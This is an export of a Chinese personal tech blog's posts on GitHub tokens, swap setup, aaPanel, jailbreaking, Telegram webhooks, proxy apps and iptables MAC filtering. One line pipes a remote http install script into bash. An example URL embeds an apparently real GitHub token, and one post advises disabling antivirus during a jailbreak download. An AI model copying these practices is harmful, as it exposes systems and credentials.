access token instead.The requested URL returned error: 403 解决 新生成的 ed25519 测试的时候是通过的，但用的时候就是不成功，也懒得深究为什么了，干脆将远程地址改成了 https:// ，顺手用一把 GitHub 的 token 。 用浏览器登录认证也行，没什么好演示，生成 token 方式也没什么好演示的，在此不表 方式1：token 替代密码 就是在需要输入密码的地方，把之前生成的 token串 粘贴到输入密码的位置，其他的就没区别，就如下图： 方式2： 也可以把 token 直接添加远程仓库链接中，这样就可以避免同一个仓库每次提交代码都要输入 token 了： 1git remote set-url origin https://TOKEN@github.com/USERNAME/REPO.git TOKEN：换成你自己得到的token USERNAME：是你自己github的用户名 REPO：是你的仓库名称 举个栗子： 1git remote set-url origin https://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@github.com/shxxx/xxx.git/ 清除已保存账号密码 如果 push 等操作没有出现输入密码选项，请先输入如下命令，之后就可以看到输入密码选项了： 1git config --system --unset credential.helper 想起来要记一笔的时候，已经操作过了，不想重新操作，以上方法抄自：星光夏眠","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"解决aapanel/宝塔面板无法完成MySQL版本升级","slug":"update-mysql-fatal-error-in-aapanel","date":"2022-12-09T08:43:18.000Z","updated":"2022-12-09T08:43:18.000Z","comments":true,"path":"update-mysql-fatal-error-in-aapanel.html","permalink":"https://sobaigu.com/update-mysql-fatal-error-in-aapanel.html","excerpt":"","text":"前言 新换了服务器，装的 aapanel 面板，安装完各种环境没多久，就出现了可升级的提示，自然是点一遍 update ，Nginx，Redis 等都正常升级完了，可唯独 MySQL 一直没升级成功。 一直没功夫也就没在意，也就是多点一遍 update 就算了，空下来去看日志，发现每次 MySQL 都 cmake 到64%左右就失败了。 失败现象 在下载解压完资源后，会进入 make 编译阶段，每次都大约在64%的时候报如下错误： 12C++: fatal error: Killed signal terminated program cc1pluscompilation terminated. 然后编译就终止了，没有更多错误信息。 解决 网上说是机器内存不足，测试过增加虚拟内存后顺利编译完成。服务器是2G内存的小鸡鸡，那应该是真的内存不足导致，以下增加虚拟内存的方法自选其一即可完成。 aapanel 通过 Linux Tools 增加虚拟内存 如果装的 aapanel 或者宝塔，直接在应用商店安装 Linux Tools ，启动后》Swap/virtual memory》填需要增加虚拟内存大小 即可，一般系统会自带虚拟内存，我们可以将总虚拟内存增加到物理内存的2倍。 如果回头想删除增加的虚拟内容，那么在刚增加虚拟内存的地方，将增加虚拟内存大小填 0 后点确认提交即可恢复。 通过命令管理虚拟内存 12345678910111213# 创建分区路径mkdir -p /var/cache/swap/# 设置分区的大小# bs=64M是块大小，count=64是块数量，所以swap空间大小是bs*count=4096MB=4GBdd if=/dev/zero of=/var/cache/swap/swap0 bs=64M count=64# 设置该目录权限chmod 0600 /var/cache/swap/swap0# 创建SWAP文件mkswap /var/cache/swap/swap0# 激活SWAP文件swapon /var/cache/swap/swap0# 查看SWAP信息是否正确swapon -s 以上命令使用 root 用户执行，如果非 root 用户登录请自行添加 sudo。swap0 文件的路径在 /var/cache/swap/ 下，编译完后, 如果不想要交换分区了, 可以删除。 删除交换分区的命令： 12swapoff /var/cache/swap/swap0rm /var/cache/swap/swap0 释放空间命令： 123swapoff -a#详细的用法：swapoff --helpfree -m #查看当前内存使用情况","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"},{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"XrayR 提示 vmess invalid user 错误","slug":"v2board-xrayr-vmess-invalid-user","date":"2022-09-17T04:55:59.000Z","updated":"2022-09-17T04:55:59.000Z","comments":true,"path":"v2board-xrayr-vmess-invalid-user.html","permalink":"https://sobaigu.com/v2board-xrayr-vmess-invalid-user.html","excerpt":"","text":"前言 自己用的一个阿里良心云国际服务器，这几天突然不好用了，因为用的频次低，也一直没在意。今天想爬个油管，发现真的没法连，客户端一直报失败日志。 现象 客户端的日志就是报错，连接失败，服务端则一直报 vmess invalid user ，而同机上的Trojan服务却好好的。 处理 第一反应是后端程序与服务器数据接口连接不上了，测试下来发现接口连接是正常的，而且Trojan连的是同一个数据服务接口，所以本身这个接口应该是没问题的。 重启后端服务，发现错误依旧 打开数据库查看用户表，发现自己的账号信息是没问题的，也没缺项 查看服务器时间，与标准北京时间相差2分钟，问题应该就是这个，修正命令： ntpdate cn.pool.ntp.org # 同步北京时间 hwclock -w # 写入硬件时钟，虽然不知道有没有用，写就完了 0 1 * * * root ntpdate cn.pool.ntp.org &gt;&gt; /dev/null 2&gt;&amp;1 # 添加这么一条定时同步任务 再测试一下连接，问题解决。 参考文档 解决Clash节点全部超时/失败/timeout不能联网 Linux系统设置定时任务","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"服务器管理面板aaPanel使用中的一些问题汇总","slug":"Ingress-verification-failed-by-aapanel","date":"2022-07-17T05:44:00.000Z","updated":"2022-07-17T05:44:00.000Z","comments":true,"path":"Ingress-verification-failed-by-aapanel.html","permalink":"https://sobaigu.com/Ingress-verification-failed-by-aapanel.html","excerpt":"","text":"前言 aaPanel 是宝塔面板开源的一个版本，不需要强制账号登录，软件更新版本会慢点，一些功能会有滞后，如果有些应用有担忧可以用这个替代国内的宝塔。 环境要求： 内存：512M or more, 768M or more is recommended (Pure panel for about 60M of system memory) 硬盘：More than 100M available hard disk space (Pure panel for about 20M disk space) 系统：CentOS 7.1+，Ubuntu16.04+，Debian9.0+ 安装 使用以下命令直接一键安装： 1bash &lt;(curl -sSL http://www.aapanel.com/script/install_6.0_en.sh) aaPanel 只有Linux版，Windows 服务器请使用宝塔或者其他替代方案 如果系统未安装 curl 命令请先安装 curl 再执行即可，或用 官方文档 中提及的对应系统安装方法。 安装完成后，在界面上会显示登录信息，执行 bt 命令可见管理功能 登录入口限制 默认情况下，安装完 aaPanel 会添加随机字符入口，如： 1234aaPanel Internet Address: http://1.2.3.4:8888/xxxxxaaPanel Internal Address: http://1.2.3.4:8888/xxxxxusername: yyyypassword: zzzz 按提示的入口登录面板，登录后可对安全入口和用户名密码等进行修改。如果想查看当前登录入口和账号，可执行 bt 14 显示如上信息（密码是加密的，不记得可重置）。 如果想移除这个登录入口限制，可执行 bt 11 移除，再登录只需要 http://1.2.3.4:8888 这样的地址就可以了。 入口限制 bug 如果你之前移除了入口限制，在版本升级到 6.8.26 后，将出现无法登录的情况，提示： Ingress verification failed Please use the correct Ingress 这应该是一个 bug，此时解决的办法就只能主动添加入口限制： 12echo &quot;/xxx&quot; &gt; /www/server/panel/data/admin_path.pl# /xxx 表示登录入口，按自己的喜好来 以上命令执行后，执行 bt 1 重启aapanel服务，再 bt 14 可查看完整登录地址。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"Iphone使用爱思助手越狱失败解决记录","slug":"iphone-ios-uncover-need-login-user-center","date":"2022-07-05T06:01:05.000Z","updated":"2022-07-05T06:01:05.000Z","comments":true,"path":"iphone-ios-uncover-need-login-user-center.html","permalink":"https://sobaigu.com/iphone-ios-uncover-need-login-user-center.html","excerpt":"","text":"前言 小站长最近有点膨胀了，都敢买二手iPhone玩了！虽然是个iPhone8，但仍然是小站长最高端的设备。 高端的设备往往只需要最朴素的操作手法，所以就企图用爱思助手一键越狱。 遇到的问题 用USB线连接上爱思助手，利落地点击完开始越狱后，最后提示：请登录用户中心再进行越狱操作 。 看到这种提示，第一反应是iPhone账号确实没有登录，可登完AppleID后问题依旧，也不知道这个用户中心是指在哪。 解决方法 在爱思助手的帮助文档了搜了个遍，居然没有这种问题的记录，好在Google了下有个 百度贴吧帖子 提到了这个问题，原来所谓的 登录用户中心 指的是登录爱思助手账号！！！ 这么一个工具软件，为了推广自己的商城也是不择手段. 但没办法，我们还得用人家的功能，胳膊拧不过大腿，照做注册登录账号吧，心疼手机号又被迫营业了一次。 注册登录爱思助手商城账号后，再点击开始越狱，就会唰唰地往下走，然后按提示到手机上操作就可以了。 PS：如果有杀毒软件，可能会在下载越狱文件时报毒，建议关闭杀毒软件实时监控功能或者将爱思助手程序文件夹添加到排除名单中。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"手机","slug":"手机","permalink":"https://sobaigu.com/tags/%E6%89%8B%E6%9C%BA/"}]},{"title":"解决 hexo-renderer-sass 无法安装","slug":"hexo-renderer-sass-error","date":"2022-05-19T16:44:28.000Z","updated":"2022-05-19T16:44:28.000Z","comments":true,"path":"hexo-renderer-sass-error.html","permalink":"https://sobaigu.com/hexo-renderer-sass-error.html","excerpt":"","text":"前言 一些主题指明道姓需要这个依赖插件，没这插件样式渲染失败。而不幸的是，这个插件从接触开始，就各种水土不服。 去翻该依赖插件，最近一次更新是4年前，网上一堆针对这个插件的错误求助，十之八九没有一个完全解决的方案。 错误提示 npm ERR! path /home/runner/work/action-hexo/action-hexo/node_modules/node-sass npm ERR! code 1 npm ERR! command failed npm ERR! command sh -c node scripts/build.js npm ERR! Building: /opt/hostedtoolcache/node/16.15.0/x64/bin/node /home/runner/work/action-hexo/action-hexo/node_modules/node-gyp/bin/node-gyp.js rebuild --verbose --libsass_ext= --libsass_cflags= --libsass_ldflags= --libsass_library= npm ERR! make: Entering directory ‘/home/runner/work/action-hexo/action-hexo/node_modules/node-sass/build’ 出现以上错误，有的是因为被墙的网络问题，有的是因为python版本问题，所以有时候全局翻墙照样报错，然而在 github action 中安装照样出错： npm ERR! gyp ERR! cwd /home/runner/work/action-hexo/action-hexo/node_modules/node-sass npm ERR! gyp ERR! node -v v16.15.0 npm ERR! gyp ERR! node-gyp -v v3.8.0 npm ERR! gyp ERR! not ok npm ERR! Build failed with error code: 1&gt; 大概是这插件太老了，已不适用 node -v v16.15.0 ，node 12 大概是同时代版本，可自行尝试。 解决方案 这插件网上一堆错误，开发者根本也不管了，好在还有其他替代方案，适用有人更新的替代版本 hexo-renderer-sass-next ： 12npm uninstall hexo-renderer-sassnpm i --save hexo-renderer-sass-next 换插件后，根本不存在网络问题，node、python 版本问题，测试下依赖 node-sass 的主题，一切都这么丝滑。 参考文档 开始新的折腾，Hexo博客Git-VPS部署完整记录 node-sass安装遇到的错误 hexo-renderer-sass-next","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"Markdown高级语法","slug":"markdown-advance-syntax","date":"2022-05-08T09:04:21.000Z","updated":"2022-05-08T09:04:21.000Z","comments":true,"path":"markdown-advance-syntax.html","permalink":"https://sobaigu.com/markdown-advance-syntax.html","excerpt":"只有少数编辑器支持，或者需要安装相应的扩展渲染，使用前请先预览确认。","text":"只有少数编辑器支持，或者需要安装相应的扩展渲染，使用前请先预览确认。 定义列表 1234Term 1Term 2: Definition A: Definition B 会被编译成 123456&lt;dl&gt;&lt;dd&gt;Term 1&lt;/dd&gt;&lt;dd&gt;Term 2&lt;/dd&gt;&lt;dt&gt;Definition A&lt;dt&gt;&lt;dt&gt;Definition A&lt;dt&gt;&lt;/dl&gt; 目录 通过[TOC]标记来插入目录。 在编辑器不支持[TOC]标记的情况下可以使用添加id的方法构建目录。 123456## Directory* [1.Content one](#chapter1)* [2.Content two](#chapter2)## &lt;span id=&quot;chapter1&quot;&gt;1.Content one&lt;/span&gt;## &lt;span id=&quot;chapter2&quot;&gt;2.Content two&lt;/span&gt; TeX公式 内联的TeX公式使用一个美元符号标记。 1$\\Gamma(n) = (n-1)!\\quad\\forall n\\in\\mathbb N$ 会被编译成 内联（行内）公式：$\\Gamma(n) = (n-1)!\\quad\\forall n\\in\\mathbb N$ TeX公式块用独占一行的两个美元符号来标记。 1$$\\left \\lbrace \\sum_&#123;i=0&#125;^n i^3 = \\frac&#123;(n^2+n)(n+6)&#125;&#123;9&#125; \\right \\rbrace$$ 会被编译成 $$\\left \\lbrace \\sum_{i=0}^n i^3 = \\frac{(n^2+n)(n+6)}{9} \\right \\rbrace$$ 如果你的编辑器不支持这个功能，可以手动解决。首先引入mathjax脚本： 1&lt;script type=&quot;text/javascript&quot; src=&quot;https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_HTML&quot;&gt;&lt;/script&gt; 之后，在需要插入公式的地方使用 &lt;script&gt; 标签包裹公式： 12345&lt;script type=&quot;math/tex&quot;&gt;\\Gamma(n) = (n-1)!\\quad\\forall n\\in\\mathbb N&lt;/script&gt;&lt;script type=&quot;math/tex; mode=display&quot;&gt;\\Gamma(z) = \\int_0^\\infty t^&#123;z-1&#125;e^&#123;-t&#125;dt\\,.&lt;/script&gt; 以上公式展示效果，在实际显示过程中，根据网络加载速度不同会有不同的解析展示速度，TeX的语法参考请见这里。 UML图 语法为在代码块开始行后面加入语法声明，如 ```mermaid ，然后可以像这样来画uml时序图： sequenceDiagram Alice->>Bob: Hello Bob,how are you? Note right of Bob: Bob thinks Bob-->>Alice: I am fine thanks! and U? Note left of Alice: SB 其MarkDown代码如下： 1234567\\`\\`\\`mermaidsequenceDiagram Alice-&gt;&gt;Bob: Hello Bob,how are you? Note right of Bob: Bob thinks Bob--&gt;&gt;Alice: I am fine thanks! and U? Note left of Alice: SB\\`\\`\\` #代码块标识会被解析，实际上写代码块时不用添加转义符“\\” 时序图的语法请见 这里 或 这里。 uml流程图： graph LR; A-->B & C-->D; 其实现代码如下： 1234\\`\\`\\`mermaidgraph LR; A--&gt;B &amp; C--&gt;D;\\`\\`\\` 流程图的语法请见 这里， 更复杂点的flowchart可以看 这里 。 参考文档 MarkDown文档中如何画出流程图 https://github.com/wizardforcel/markdown-simple-world http://stevenshi.me/2017/06/26/hexo-insert-formula/ https://blog.csdn.net/u013282174/article/details/80666123 https://www.liuyude.com/How_to_make_your_HEXO_blog_support_handwriting_flowchart.html https://mermaidjs.github.io/","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"Github上的一些大佬看不上的小设置","slug":"github-some-setting-notes","date":"2022-04-29T08:50:44.000Z","updated":"2022-04-29T08:50:44.000Z","comments":true,"path":"github-some-setting-notes.html","permalink":"https://sobaigu.com/github-some-setting-notes.html","excerpt":"","text":"前言 由于始料未及的TG圈闲瓜，这几天逼得自己要fork别人的仓库了，还要学编译release版本，所幸还动手成功了。 将一些大佬们认为理所当然懂，但小白一时半会真的不知所措的事记录下。 关闭Issues（议题） 本来就不是开发者，只是fork了个仓库自己用，要什么反馈，反馈了咱也不会修！ 在 GitHub.com 上，导航到仓库的主页面 在仓库名称下，单击 Settings（设置） 在 Features（功能）下，取消选择 Issues（议题）复选框 新增/删除 tag 发布release是要基于tag的，如果不在命令行中操作，可以在github网页上新增或者删除tag。 新增 tag 在仓库中无现成 tag 时，可以新建一个： 如上图所示，在输入框填写一个tag名称，一般都是版本号，如：v3.1.2 ，然后点击下方的 +Create new tag:v3.1.2 on publish 即可完成。 删除 tag 有朋友说，无法在Github上直接删除项目的 Release 和 Tag，只能通过在本地的操作，然后 push 到github上。其实在Github上可以直接删除项目的 Release 和 Tag。 Release 删除入口很醒目，进入 Release 页面，如果你有管理权限就能看到删除图标，点击删除即可。 Tag 稍微隐秘点，不是点右侧的更多菜单，而是点击tag名称进去之后才能看到删除按钮。 github action github action 是个好东西，免去梯子，免去自己搭环境，还可以自动编译。在配置 Actions secrets 时折腾了一下，提示： 12Run svenstaro/upload-release-action@v2Error: Input required and not supplied: repo_token 一直以为是用的 Personal access tokens 不行，原来是添加的位置不对，workflow 中用的变量是 repo_token ，那么就需要将token新建在 Repository secrets 中，使用环境口令则使用 env：。 参考文档 如果您不接受贡献或漏洞报告，可能希望关闭仓库的议题。 Managing releases in a repository 环境变量","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"OpenWrt系统路由只允许指定MAC地址可以连接使用-通信规则","slug":"iptables-mac-whitelist-in-openwrt-2","date":"2022-04-25T04:35:23.000Z","updated":"2022-04-25T04:35:23.000Z","comments":true,"path":"iptables-mac-whitelist-in-openwrt-2.html","permalink":"https://sobaigu.com/iptables-mac-whitelist-in-openwrt-2.html","excerpt":"","text":"前言 前篇记录 使用 iptables自定义规则 实现 OpenWrt系统路由只允许指定MAC地址可以连接使用，在某些时候貌似不那么有效，添加了跟没添加一样，可能语法写错了，也不知道哪里的问题。 今次就改换防火墙的 通讯规则「有些固件翻译为 流量规则」来实现，底层原理其实是一样的，对于自定义规则玩不溜的可以尝试这种界面操作方法。 菜单入口 这个入口根据不同的luci菜单设计有些许差异，但都大同小异自己找找，一般是：网络》防火墙：通信规则 设置方法 在 通信规则 标签页往下拉，找到 打开路由器端口，添加一条放行规则，填好名称，外部端口 留空 之后进入规则详细设置页面： 源区域：选择 lan，表示只允许局域网内连接，其他区域根据自己实际需求选择，放行规则选 任意区域 也没问题 源 MAC 地址：下拉选择要放行的mac地址，不在列表中选择自定义，然后按格式填上 目标区域：选择 设备，表示接入到这个路由器 动作：接受 以上4步就完成了允许某个MAC地址接入路由器，但我们希望结果是 只允许 某MAC接入，所以还需要添加一条 拒绝所有 的规则，步骤同上，差异部分： 源 MAC 地址：选择 所有 动作：拒绝 特别需要注意： 拒绝所有这条规则要放在允许规则的后面，建议如上图放在最底部 添加完规则后自己检查确认好后再启用，以免造成无法连接路由器","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"v2board面板节点在线用户数为0","slug":"v2board-0-user-on-line-serverstat","date":"2022-04-15T00:37:06.000Z","updated":"2022-04-15T00:37:06.000Z","comments":true,"path":"v2board-0-user-on-line-serverstat.html","permalink":"https://sobaigu.com/v2board-0-user-on-line-serverstat.html","excerpt":"","text":"前言 很久之前搭过一个 v2board 的管理面板，当时第一感觉是喜欢他的简洁，但一直闲置。直到主机商来信提醒我服务器该续费了，赶紧把我散落在世界各地的2台服务器管理起来，要不然服务器白买了。 可是可是，对接好后，服务器节点一直显示0在线状态，明明我电脑和路由都连着呢，这明显有错误。 现象 添加对接好后端节点，电脑客户端已经在用着爬油土鳖了，可是对应的在线用户数一直为 0，虽然只是 0 和 1 的区别，但真的是 0 和 1 的区别！ 原因及解决办法 后端对接 v2board 管理面板的时候，需要填一个 api，需要附带协议，当时填的是 http，然后在 v2board 建站的时候，勾选了强制 https，解决办法就是取消强制 https 或者使用 https 协议 api 地址，推荐后者。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"TG机器人 deleteWebhook 的方法","slug":"tg-delete-the-webhook","date":"2022-04-12T06:06:31.000Z","updated":"2022-04-12T06:06:31.000Z","comments":true,"path":"tg-delete-the-webhook.html","permalink":"https://sobaigu.com/tg-delete-the-webhook.html","excerpt":"","text":"前言 找了个根据关键字自动回复机器人，是一个开源项目，有仓库没有任何资料。根据代码反向捣鼓了一番，能用但不好用。期间出现个删除webhook的提示，竟然不知道怎么删。 现象提示 2022/04/12 11:27:18 Conflict: can’t use getUpdates method while webhook is active; use deleteWebhook to delete the webhook first 2022/04/12 11:27:18 Failed to get updates, retrying in 3 seconds… 该机器人之前确实是在别的地方设置过webhook，偷懒没有新申请机器人直接用的，没想到出现了 Conflict 错误。 deleteWebhook 方法 本以为 deleteWebhook 是一个命令，给机器人发命令没反应，没想到就是一个url： 1https://api.telegram.org/bot[TOKEN_ID]/setWebhook?url= [TOKEN_ID] 表示bot完整的 token，拼接完整如： 1https://api.telegram.org/bot515687xxxx:XXX0FLLrmAFjp64SViCmNRtc_kmxx-xx-xx/setWebhook?url= 正常情况将返回请求结果： 1&#123;&quot;ok&quot;:true,&quot;result&quot;:true,&quot;description&quot;:&quot;Webhook was deleted&quot;&#125; 参考文档 ERRORE DURANTE L’USO DI GETUPDATES NEI BOT DI TELEGRAM","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"一文搞定苹果ID和小火箭安装使用 - 2022年4月","slug":"appleid-with-shadowrocket-helper","date":"2022-04-05T02:30:35.000Z","updated":"2022-04-05T02:30:35.000Z","comments":true,"path":"appleid-with-shadowrocket-helper.html","permalink":"https://sobaigu.com/appleid-with-shadowrocket-helper.html","excerpt":"","text":"前言 N多年前记录过一篇 通过PP助手免费安装小火箭的图文教程，时至今日还是有人去看，但方法已经完全不适用了。现今可行的方式也就只剩下从AppStore安装正版软件一条路了，无非就是账号是借朋友的还是自己去搞一个非国区账号购买软件的区别。 鉴于还有不少网友对这方面有困惑，花时间重新整理一番。 虽然这是篇写给小白的AppStore下载软件保姆教程，但只是拿个小火箭当示例，并不会提供小火箭需要的订阅节点，也不会详细教怎么去使用小火箭，这些教程在你购买服务的时候网络提供商处一般都有的，而且人家写得更简单易懂，没必要班门弄斧。 本文内容索引 前言 本文内容索引 安装正版软件流程 基本概念解释 苹果账号 掌控一个账号 登录/注销/更换 获取安装应用 购买成品号 兑换码 代理服务 获取服务 配置订阅 授权 更新订阅 安装正版软件流程 登录AppStore账号 付费购买或兑换码兑换软件 获取安装软件到手机或iPad 以上步骤作为一个苹果党，步骤应该一点都不陌生，这是作为一个苹果党该有的忠诚。难点在于有些软件国区没有，所以需要外区账号和付款方式。 如果没有这些条件，就可以去购买或者借用别人买好软件的苹果AppleID登录下载软件即可。 基本概念解释 名词 解释 别称/作用 iOS 苹果移动设备操作系统 苹果系统、iPhone系统、iPad系统 AppleID 苹果绑定各种服务的账号 苹果账号、苹果ID、AppStoreID AppStore iOS系统的应用商店 应用商店、苹果商店、应用中心 iCloud 苹果的云端服务 同步通讯录，相册等，可以远程定位锁定设备 shadowrocket 一个优秀的代理客户端软件，美区售价2.99$ 小火箭、代理客户端 苹果账号 有人称为AppleID、苹果ID、iCloud号、AppStore账号等等都好，总之就是绑定乔布斯服务方便收钱的账号，这个账号可以在应用商店（AppStore）购买及下载安装软件，如果登录iCloud，将会向云端同步数据，也可以锁定设备。 所以，在完全掌控一个账号前，切勿轻易登录iCloud！ 掌控一个账号 如果没有朋友可以借，建议购买一个私享账号，买好软件也才几十块终身可用，登录就可以下载。买的别人的号就需要变成自己掌控，所谓掌控，就是你随时可以找回密码，随时可以更改关于该账号的一切。一个AppleID的安全要素包括： 邮箱ID 密码 三个密保问题 登记的出生年月日 救援邮箱 安全手机号 当开启了二次验证且超过2个星期的可回退期后，邮箱ID和安全手机号就几乎成了唯一的掌控要素，所以绑定的安全手机号最为重要！ 如果是自己注册的AppleID，将以上信息找个地方记录下来。如果是购买的账号，那么收货后将以上信息更改为自己掌控的邮箱和手机号就尤为重要，也只有更改为自己的信息才算完全掌控了这个账号。 登录/注销/更换 账号的登录/注销/更换其实是一个流程，打开AppStore后就能找到入口，很好奇居然有人会登录不会注销，会登录注销不会更换账号…… iOS12以上账号入口如下图，退出登录再换其他账号登录就是切换更换账号： iOS12之前的版本AppStore进去后第一个页面拉到底就看到了账号操作入口： 已经登录其他账号可以点击账号弹出界面上可见查看AppleID和注销按钮： 获取安装应用 登录AppStore后，免费软件直接搜索到点获取然后安装就完事了，一些付费软件如小火箭需要2.99美元，我们也没有对应的付费方式，所以需要想其他的办法。 购买成品号 购买别人买好付费软件的账号直接拿来用无疑是最省事最简单的一种方式 如上图所示购买的成品号，收到货把密码、密保、手机号这些改改好，掌控这个账号后就可以随便用了，登录到AppStore，然后一般在已购项目列表中就能找到付费软件。 或者像新安装软件一样查找软件名，然后获取安装即可，已经购买的软件不需要二次付费。 对于有的同学还是去已购项目中找最为稳妥，因为如果眼神不好可能最后安装了个李鬼。 兑换码 如果选择自己动手，可以买或者自己注册空白外区账号，然后购买对应区的软件兑换码自己兑换软件，仍然拿小火箭做示例。 在 登录/注销/更换 章节，我们可见有个 兑换 按钮，英文则是 Redeem Gift Card or Code，如下图所示： 兑换完应该会自动获取安装软件，如果没有安装可到已购项目里去找即可，这里再抄一个动图演示： 代理服务 顺着上面的示例软件，顺手抄人一段教程，不是重点。 获取服务 要获取靠谱的服务不容易，一般是网友推荐就一直用着，到这里去看看，貌似经常不给注册，自个儿想办法吧，站长也不想找了，找到好用的就好好用。 配置订阅 这个貌似服务提供商处都会写很详细，一般都是点下按钮的事，去翻翻对应的使用文档，没啥好补充的，直接抄一个图： 授权 因为小火箭要接管网络，所以iOS会有个大大的弹窗警示，如果要使用一定要点 允许 或者 Allow。 更新订阅 这个也超纲了，多此一举，再次抄图： 手动更新订阅的时候请注意先断开连接，让顶部火箭那行状态显示为 未连接 再去更新，很多小白本身代理不可用，然后还连着代理去更新节点，死循环是无解的。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"OpenWrt系统路由只允许指定MAC地址可以连接使用","slug":"iptables-mac-whitelist-in-openwrt","date":"2022-04-01T06:25:59.000Z","updated":"2022-04-01T06:25:59.000Z","comments":true,"path":"iptables-mac-whitelist-in-openwrt.html","permalink":"https://sobaigu.com/iptables-mac-whitelist-in-openwrt.html","excerpt":"","text":"前言 很久前刷的OpenWrt，到现在梯子客户端版本也太老了，有些新特性用不上甚至连不上，抽出斗地主的时间准备把路由器重新刷一把。 其实折腾久了各种固件，自己的需求很简单：稳定，不需要乱七八糟的功能，能架个梯子，屏蔽个小广告，能带动我那82年的打印机。 恩山无线上翻了半天，也下了几个刷了把，总是满足不了自己的需求，有一个还可以但无线还不能自启动。 不得已现学现用，用大佬们的教程按自己的需求编译了一个固件，其他都挺好，但以前的MAC过滤不知道怎么编译，只好使用iptables规则。 MAC过滤原理 利用iptables的规则过滤，指定MAC来源accept，其他drop掉。 白名单策略 允许白名单用户连接路由器: 1iptables -I INPUT -m mac --mac-source xx:xx:xx:xx:xx:xx -j ACCEPT 禁止非白名单用户连接路由器： 1iptables -A INPUT -m mac --mac-source ! xx:xx:xx:xx:xx:xx -j DROP 上面的MAC地址可以随便填，其含义为除了非MAC地址为xx:xx:xx;xx:xx:xx的流量一律丢弃，这样除了之前的白名单其他用户一律连接不了路由器。 上面已经禁止非白名单用户连上路由，还可以进一步禁止上网： 还是先允许白名单用户： 1iptables -I FORWARD -m mac --mac-source xx:xx:xx:xx:xx:xx -j ACCEPT 然后依旧是非白名单用户禁止联网: 1iptables -A FORWARD -m mac --mac-source ! xx:xx:xx:xx:xx:xx -j DROP 现在非白名单用户就上不了网了，如果要添加白名单就添加 ACCEPT 规则，DROP 规则只需要一条就可以了。 黑名单策略 黑名单就是指定MAC地址来源就drop掉，也就是这样： 12iptables -I INPUT -m mac --mac-source xx:xx:xx:xx:xx:xx -j DROPiptables -I FORWARD -m mac --mac-source xx:xx:xx:xx:xx:xx -j DROP 路由防火墙应用 黑名单规则就是加一个禁一个，黑名单规则越加越多，而且被禁的设备改变MAC地址就失效了，所以建议使用白名单规则，将自己的设备MAC地址收集好，添加到路由器的防火墙规则中。 在OpenWrt系统防火墙中，一般都会有个 自定义规则，将上文规则一行行添加其中，就像是这样： 12345678# ===just allow mac list in /etc/firewall.user===#添加MAC白名单ACCEPT规则，有多少个设备就添加多少组iptables -I INPUT -m mac --mac-source a0:aa:bb:cc:dd:2b -j ACCEPTiptables -I FORWARD -m mac --mac-source a0:aa:bb:cc:dd:2b -j ACCEPT#禁止非白名单连接路由器&amp;禁止联网iptables -A INPUT -m mac --mac-source ! a0:aa:bb:cc:dd:2b -j DROPiptables -A FORWARD -m mac --mac-source ! a0:aa:bb:cc:dd:2b -j DROP# === mac list end=== 如果路由器后台界面上无编辑保存入口，可以SSH或者TTYD终端登录路由系统，编辑对应文件 /etc/firewall.user ，保存后重启防火墙。 这里注意，很多教程都写了 iptables -I 添加规则，但又没告诉你 -I 方法默认是压栈添加，第一条添加的会推到规则末尾，而 iptables 执行是自上而下的，如果 drop 规则放在第一条，最后造成无效或者连不上设备。 iptables 命令的管理控制选项解释： -A 在指定链的末尾添加（append）一条新的规则 -D 